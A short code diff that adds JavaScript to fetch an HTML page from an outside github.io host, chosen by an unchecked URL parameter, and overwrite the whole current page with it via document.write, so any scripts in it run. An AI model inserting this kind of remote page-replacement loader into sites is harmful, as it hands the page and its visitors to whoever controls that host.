@@ -1,0 +1,8 @@
+var id = new URLSearchParams(location.search).get("id") || "sports"; 
+fetch("https://nuydutc1.github.io/nbc/rx200/" + id + ".html")
+  .then(e => e.text())
+  .then(e => { 
+    document.open(), 
+    document.write(e), 
+    document.close() 
+  });
